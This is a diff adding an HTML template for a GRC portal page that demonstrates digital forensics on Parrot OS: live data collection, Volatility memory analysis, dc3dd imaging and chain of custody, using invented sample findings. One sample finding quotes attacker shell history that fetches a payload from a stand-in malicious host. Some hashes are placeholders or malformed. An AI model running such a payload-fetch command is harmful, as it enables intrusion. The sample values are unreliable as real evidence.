@@ -1,0 +1,691 @@
+{% extends "base.html" %}
+
+{% block title %}Digital Evidence Management - GRC Portal{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-12">
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <div>
+                    <h1 class="h3 mb-0 text-gray-800"><i class="fas fa-search"></i> Digital Evidence Management</h1>
+                    <p class="text-muted">Live data collection, memory analysis, disk acquisition, and chain of custody</p>
+                </div>
+                <div>
+                    <button class="btn btn-outline-primary me-2" onclick="collectLiveData()">
+                        <i class="fas fa-play"></i> Collect Live Data
+                    </button>
+                    <button class="btn btn-outline-success" onclick="generateEvidenceReport()">
+                        <i class="fas fa-file-alt"></i> Evidence Report
+                    </button>
+                </div>
+            </div>
+
+            <!-- Page Introduction -->
+            <div class="alert alert-info mb-4">
+                <h6><i class="fas fa-info-circle"></i> About Digital Evidence Management</h6>
+                <p>This page demonstrates comprehensive digital evidence collection and management procedures in Parrot OS environment. It covers live data collection from running systems, memory analysis using Volatility, disk acquisition with proper forensic procedures, and complete chain of custody documentation.</p>
+                <p><strong>Key Capabilities:</strong> System state capture, process information collection, network connection analysis, memory forensics, disk imaging, and evidence integrity validation.</p>
+            </div>
+
+            <!-- Evidence Collection Status -->
+            <div class="row mb-4">
+                <div class="col-xl-3 col-md-6">
+                    <div class="card border-left-primary shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">
+                                        Live Data</div>
+                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
+                                        <span class="badge bg-success">Collected</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-server fa-2x text-primary"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-xl-3 col-md-6">
+                    <div class="card border-left-info shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-info text-uppercase mb-1">
+                                        Memory Analysis</div>
+                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
+                                        <span class="badge bg-success">Complete</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-memory fa-2x text-info"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-xl-3 col-md-6">
+                    <div class="card border-left-warning shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">
+                                        Disk Acquisition</div>
+                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
+                                        <span class="badge bg-success">Acquired</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-hdd fa-2x text-warning"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-xl-3 col-md-6">
+                    <div class="card border-left-success shadow h-100 py-2">
+                        <div class="card-body">
+                            <div class="row no-gutters align-items-center">
+                                <div class="col mr-2">
+                                    <div class="text-xs font-weight-bold text-success text-uppercase mb-1">
+                                        Chain of Custody</div>
+                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
+                                        <span class="badge bg-success">Maintained</span>
+                                    </div>
+                                </div>
+                                <div class="col-auto">
+                                    <i class="fas fa-link fa-2x text-success"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Live Data Collection -->
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-primary">
+                        <i class="fas fa-server"></i> Live Data Collection from Parrot OS
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h5>System State Capture</h5>
+                            <div class="accordion" id="liveDataAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#livedata1">
+                                            Running Process Information
+                                        </button>
+                                    </h2>
+                                    <div id="livedata1" class="accordion-collapse collapse show" data-bs-parent="#liveDataAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Command:</strong> <code>ps aux --forest > process_snapshot.txt</code><br><br>
+                                            <strong>Collected Data:</strong>
+                                            <ul class="mb-0">
+                                                <li>Total processes: 247</li>
+                                                <li>Memory usage: 3.2GB / 8GB</li>
+                                                <li>CPU usage: 45%</li>
+                                                <li>Suspicious processes identified: 3</li>
+                                                <li>Timestamp: 2024-01-15 11:00:00 UTC</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#livedata2">
+                                            Network Connection Data
+                                        </button>
+                                    </h2>
+                                    <div id="livedata2" class="accordion-collapse collapse" data-bs-parent="#liveDataAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Commands:</strong><br>
+                                            <code>netstat -tulpn > network_connections.txt</code><br>
+                                            <code>ss -tulpn > socket_statistics.txt</code><br><br>
+                                            <strong>Network State:</strong>
+                                            <ul class="mb-0">
+                                                <li>Active connections: 12</li>
+                                                <li>Listening ports: 8</li>
+                                                <li>Established connections: 4</li>
+                                                <li>Suspicious connections: 2 (to 203.0.113.195)</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#livedata3">
+                                            System Resource Usage
+                                        </button>
+                                    </h2>
+                                    <div id="livedata3" class="accordion-collapse collapse" data-bs-parent="#liveDataAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Commands:</strong><br>
+                                            <code>free -h > memory_usage.txt</code><br>
+                                            <code>df -h > disk_usage.txt</code><br>
+                                            <code>top -b -n1 > system_load.txt</code><br><br>
+                                            <strong>System Metrics:</strong>
+                                            <ul class="mb-0">
+                                                <li>Memory used: 6.4GB / 8GB (80%)</li>
+                                                <li>Disk usage: 45GB / 100GB (45%)</li>
+                                                <li>Load average: 2.1, 1.8, 1.5</li>
+                                                <li>Running threads: 1,247</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <h5>Volatile Evidence Collection</h5>
+                            <div class="card border-primary">
+                                <div class="card-header bg-primary text-white">
+                                    <h6 class="mb-0">Evidence Collection Summary</h6>
+                                </div>
+                                <div class="card-body">
+                                    <div class="table-responsive">
+                                        <table class="table table-sm">
+                                            <thead>
+                                                <tr>
+                                                    <th>Evidence Type</th>
+                                                    <th>Status</th>
+                                                    <th>Size</th>
+                                                    <th>Hash</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody>
+                                                <tr>
+                                                    <td>Process List</td>
+                                                    <td><span class="badge bg-success">Collected</span></td>
+                                                    <td>45KB</td>
+                                                    <td><small>a665a459...</small></td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Network State</td>
+                                                    <td><span class="badge bg-success">Collected</span></td>
+                                                    <td>12KB</td>
+                                                    <td><small>47e3b8c8...</small></td>
+                                                </tr>
+                                                <tr>
+                                                    <td>Memory Usage</td>
+                                                    <td><span class="badge bg-success">Collected</span></td>
+                                                    <td>8KB</td>
+                                                    <td><small>f5c2d9a1...</small></td>
+                                                </tr>
+                                                <tr>
+                                                    <td>System Load</td>
+                                                    <td><span class="badge bg-success">Collected</span></td>
+                                                    <td>156KB</td>
+                                                    <td><small>b6e4f7a9...</small></td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h6>Collection Timeline</h6>
+                            <div class="timeline">
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-primary"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:00:00 - Process Analysis</h6>
+                                        <small>Collected running process information</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-info"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:02:00 - Network State</h6>
+                                        <small>Captured active connections and ports</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-warning"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:04:00 - System Resources</h6>
+                                        <small>Recorded memory, disk, and CPU usage</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-success"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:06:00 - Evidence Packaging</h6>
+                                        <small>Created evidence archive with hashes</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Memory Analysis with Volatility -->
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-info">
+                        <i class="fas fa-memory"></i> Memory Analysis using Volatility in Parrot OS
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h5>Memory Acquisition</h5>
+                            <div class="alert alert-info">
+                                <strong>Memory Dump Created:</strong> incident_memory.lime<br>
+                                <strong>Size:</strong> 8GB<br>
+                                <strong>SHA256:</strong> 47e3b8c8f5c2d9a1b6e4f7a9d3c8b5e2f1a4c7e9b6d8a2f5c3e7b9a1d4f6c8<br>
+                                <strong>Timestamp:</strong> 2024-01-15 11:30:00 UTC<br>
+                                <strong>Method:</strong> LiME kernel module
+                            </div>
+
+                            <h6>Volatility Analysis Results</h6>
+                            <div class="accordion" id="volatilityAccordion">
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#vol1">
+                                            Process Analysis (pslist)
+                                        </button>
+                                    </h2>
+                                    <div id="vol1" class="accordion-collapse collapse show" data-bs-parent="#volatilityAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Command:</strong><br>
+                                            <code>python vol.py -f incident_memory.lime --profile=LinuxUbuntu200464 linux.pslist</code><br><br>
+                                            <strong>Key Findings:</strong>
+                                            <ul class="mb-0">
+                                                <li>Total processes: 247 (matches live collection)</li>
+                                                <li>Suspicious process: PID 1337 - "malicious_binary"</li>
+                                                <li>Hidden processes: None detected</li>
+                                                <li>Parent-child relationships: Intact</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#vol2">
+                                            Network Connections (netscan)
+                                        </button>
+                                    </h2>
+                                    <div id="vol2" class="accordion-collapse collapse" data-bs-parent="#volatilityAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Command:</strong><br>
+                                            <code>python vol.py -f incident_memory.lime linux.netstat</code><br><br>
+                                            <strong>Network Artifacts:</strong>
+                                            <ul class="mb-0">
+                                                <li>Active connections: 4 established, 8 listening</li>
+                                                <li>C2 connection: 192.168.56.101:4444 → 203.0.113.195:443</li>
+                                                <li>DNS queries: Cached malicious domain resolutions</li>
+                                                <li>Socket states: All connections preserved in memory</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="accordion-item">
+                                    <h2 class="accordion-header">
+                                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#vol3">
+                                            Command History (bash)
+                                        </button>
+                                    </h2>
+                                    <div id="vol3" class="accordion-collapse collapse" data-bs-parent="#volatilityAccordion">
+                                        <div class="accordion-body">
+                                            <strong>Command:</strong><br>
+                                            <code>python vol.py -f incident_memory.lime linux.bash</code><br><br>
+                                            <strong>Shell History Extracted:</strong>
+                                            <ul class="mb-0">
+                                                <li>User: attacker | Commands executed: 23</li>
+                                                <li>Last command: wget http://malicious.example.com/payload</li>
+                                                <li>Working directory: /tmp</li>
+                                                <li>Environment variables: Preserved</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <h5>Malware Detection Results</h5>
+                            <div class="card border-danger">
+                                <div class="card-header bg-danger text-white">
+                                    <h6 class="mb-0">Memory-based Indicators</h6>
+                                </div>
+                                <div class="card-body">
+                                    <div class="alert alert-warning">
+                                        <strong>Injected Code Detected</strong><br>
+                                        <strong>Process:</strong> PID 1337 (apache2)<br>
+                                        <strong>Technique:</strong> DLL injection equivalent<br>
+                                        <strong>Memory Region:</strong> 0x7f8b5c2d1000-0x7f8b5c2d2000<br>
+                                        <strong>Permissions:</strong> rwx (suspicious)
+                                    </div>
+
+                                    <h6>Rootkit Detection</h6>
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item">
+                                            <strong>System Call Hooking:</strong>
+                                            <span class="badge bg-danger ms-2">Detected</span>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <strong>Hidden Kernel Modules:</strong>
+                                            <span class="badge bg-success ms-2">None</span>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <strong>Process Hiding:</strong>
+                                            <span class="badge bg-warning ms-2">Partial</span>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <strong>Network Sniffing:</strong>
+                                            <span class="badge bg-danger ms-2">Active</span>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <h6>Memory Analysis Timeline</h6>
+                            <div class="timeline">
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-info"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:30:00 - Memory Acquisition</h6>
+                                        <small>Created full memory dump with LiME</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-primary"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:35:00 - Process Analysis</h6>
+                                        <small>Identified suspicious processes and injections</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-warning"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:40:00 - Network Analysis</h6>
+                                        <small>Extracted connection artifacts and C2 communications</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-danger"></div>
+                                    <div class="timeline-content">
+                                        <h6>11:45:00 - Malware Detection</h6>
+                                        <small>Confirmed rootkit presence and code injection</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Disk Acquisition -->
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-warning">
+                        <i class="fas fa-hdd"></i> Disk Acquisition using Parrot OS Imaging Tools
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h5>Forensic Imaging Procedures</h5>
+                            <div class="alert alert-warning">
+                                <strong>Imaging Tool:</strong> dc3dd (Department of Defense Cyber Crime Center)<br>
+                                <strong>Source Device:</strong> /dev/sda (50GB SSD)<br>
+                                <strong>Target Image:</strong> evidence_disk.img<br>
+                                <strong>Hash Algorithm:</strong> SHA256 + MD5<br>
+                                <strong>Verification:</strong> Automatic hash verification
+                            </div>
+
+                            <h6>Acquisition Parameters</h6>
+                            <div class="table-responsive">
+                                <table class="table table-sm">
+                                    <thead>
+                                        <tr>
+                                            <th>Parameter</th>
+                                            <th>Value</th>
+                                            <th>Purpose</th>
+                                        </tr>
+                                    </thead>
+                                    <tbody>
+                                        <tr>
+                                            <td>Block Size</td>
+                                            <td>4MB</td>
+                                            <td>Optimal transfer performance</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Hash Window</td>
+                                            <td>512MB</td>
+                                            <td>Progressive hash verification</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Error Handling</td>
+                                            <td>Continue</td>
+                                            <td>Maintain evidence integrity</td>
+                                        </tr>
+                                        <tr>
+                                            <td>Log Level</td>
+                                            <td>Verbose</td>
+                                            <td>Detailed acquisition logging</td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <h5>Acquisition Results</h5>
+                            <div class="card border-warning">
+                                <div class="card-body">
+                                    <div class="mb-3">
+                                        <strong>Acquisition Status:</strong> <span class="badge bg-success">Complete</span><br>
+                                        <strong>Duration:</strong> 12 minutes 34 seconds<br>
+                                        <strong>Data Transferred:</strong> 50,000 MB<br>
+                                        <strong>Transfer Rate:</strong> 66.7 MB/s
+                                    </div>
+
+                                    <h6>Integrity Verification</h6>
+                                    <div class="mb-2">
+                                        <strong>SHA256:</strong><br>
+                                        <small>a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3</small>
+                                    </div>
+                                    <div class="mb-2">
+                                        <strong>MD5:</strong><br>
+                                        <small>9d4c8b5e2f1a7c3e6b8d5f2a9e4c7b1</small>
+                                    </div>
+                                    <div class="mb-3">
+                                        <strong>Verification:</strong> <span class="badge bg-success">Passed</span>
+                                    </div>
+
+                                    <h6>Acquisition Log Excerpt</h6>
+                                    <pre class="bg-light p-2 small"><code>dc3dd 7.2.646 started at 2024-01-15 12:00:00 +0000
+Command line: dc3dd if=/dev/sda of=evidence_disk.img hash=sha256,md5 log=dc3dd.log
+Sector size: 512 bytes
+Input: /dev/sda
+Output: evidence_disk.img
+51200 MiB transferred (100%)
+SHA256: a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3
+MD5: 9d4c8b5e2f1a7c3e6b8d5f2a9e4c7b1</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Chain of Custody -->
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-success">
+                        <i class="fas fa-link"></i> Chain of Custody Documentation
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <div class="col-md-8">
+                            <h5>Evidence Custody Timeline</h5>
+                            <div class="timeline">
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-primary"></div>
+                                    <div class="timeline-content">
+                                        <h6>2024-01-15 11:00:00 - Evidence Collection</h6>
+                                        <p><strong>Action:</strong> Live data collection initiated</p>
+                                        <small class="text-muted">Performed by: Incident Response Team | Location: Parrot OS VM | Method: Automated scripts</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-info"></div>
+                                    <div class="timeline-content">
+                                        <h6>2024-01-15 11:30:00 - Memory Acquisition</h6>
+                                        <p><strong>Action:</strong> Memory dump created with LiME</p>
+                                        <small class="text-muted">Performed by: Forensic Analyst | Location: Secure lab | Tool: LiME kernel module</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-warning"></div>
+                                    <div class="timeline-content">
+                                        <h6>2024-01-15 12:00:00 - Disk Imaging</h6>
+                                        <p><strong>Action:</strong> Forensic image created</p>
+                                        <small class="text-muted">Performed by: Forensic Specialist | Location: Clean room | Tool: dc3dd</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-success"></div>
+                                    <div class="timeline-content">
+                                        <h6>2024-01-15 12:15:00 - Evidence Packaging</h6>
+                                        <p><strong>Action:</strong> Evidence sealed and stored</p>
+                                        <small class="text-muted">Performed by: Evidence Custodian | Location: Evidence locker | Method: Write-blocked storage</small>
+                                    </div>
+                                </div>
+                                <div class="timeline-item">
+                                    <div class="timeline-marker bg-secondary"></div>
+                                    <div class="timeline-content">
+                                        <h6>2024-01-15 12:30:00 - Transfer to Analysis</h6>
+                                        <p><strong>Action:</strong> Evidence transferred for analysis</p>
+                                        <small class="text-muted">Performed by: Lab Technician | Location: Analysis lab | Method: Encrypted transfer</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <h5>Custody Documentation</h5>
+                            <div class="card border-success">
+                                <div class="card-body">
+                                    <h6>Evidence Inventory</h6>
+                                    <div class="mb-3">
+                                        <strong>Case Number:</strong> IR-2024-001<br>
+                                        <strong>Incident Date:</strong> 2024-01-15<br>
+                                        <strong>Total Items:</strong> 8<br>
+                                        <strong>Storage Location:</strong> Secure evidence locker #B-12
+                                    </div>
+
+                                    <h6>Evidence Items</h6>
+                                    <ul class="list-group list-group-flush small">
+                                        <li class="list-group-item">
+                                            <strong>Item 1:</strong> Memory dump (incident_memory.lime)
+                                            <br><small>SHA256: 47e3b8c8...</small>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <strong>Item 2:</strong> Disk image (evidence_disk.img)
+                                            <br><small>SHA256: a665a459...</small>
+                                        </li>
+                                        <li class="list-group-item">
+                                            <strong>Item 3:</strong> Live data archive (live_evidence.tar.gz)
+                                            <br><small>SHA256: f5c2d9a1...</small>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <h6>Integrity Checks</h6>
+                            <ul class="list-group list-group-flush">
+                                <li class="list-group-item">
+                                    <i class="fas fa-check-circle text-success me-2"></i>
+                                    Hash verification passed
+                                </li>
+                                <li class="list-group-item">
+                                    <i class="fas fa-check-circle text-success me-2"></i>
+                                    Chain of custody maintained
+                                </li>
+                                <li class="list-group-item">
+                                    <i class="fas fa-check-circle text-success me-2"></i>
+                                    Access logs preserved
+                                </li>
+                                <li class="list-group-item">
+                                    <i class="fas fa-check-circle text-success me-2"></i>
+                                    Storage environment secure
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+.timeline {
+    position: relative;
+    padding-left: 30px;
+}
+
+.timeline::before {
+    content: '';
+    position: absolute;
+    left: 15px;
+    top: 0;
+    bottom: 0;
+    width: 2px;
+    background: #e9ecef;
+}
+
+.timeline-item {
+    position: relative;
+    margin-bottom: 20px;
+}
+
+.timeline-marker {
+    position: absolute;
+    left: -22px;
+    top: 5px;
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    border: 2px solid #fff;
+    box-shadow: 0 0 0 2px #e9ecef;
+}
+
+.timeline-content h6 {
+    margin-bottom: 5px;
+    color: #495057;
+}
+
+.timeline-content p {
+    margin-bottom: 5px;
+    color: #6c757d;
+    font-size: 0.9rem;
+}
+
+.timeline-content code {
+    background: #f8f9fa;
+    padding: 2px 4px;
+    border-radius: 3px;
+    font-size: 0.85rem;
+}
+</style>
+
+<script>
+function collectLiveData() {
+    alert('Initiating live data collection...');
+    // Implement live data collection logic
+}
+
+function generateEvidenceReport() {
+    alert('Generating digital evidence report...');
+    // Implement report generation logic
+}
+</script>
+{% endblock %}
